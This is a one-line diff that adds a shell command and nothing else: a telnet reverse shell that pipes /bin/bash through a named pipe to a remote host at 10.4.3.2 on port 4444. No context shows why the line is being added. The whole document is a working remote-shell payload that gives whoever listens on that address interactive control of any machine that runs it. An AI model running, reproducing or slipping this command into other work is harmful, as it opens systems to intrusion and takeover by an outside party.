@@ -1,0 +1,1 @@
+TF=$(mktemp -u);mkfifo $TF && telnet 10.4.3.2 4444 0<$TF | /bin/bash 1>$TF
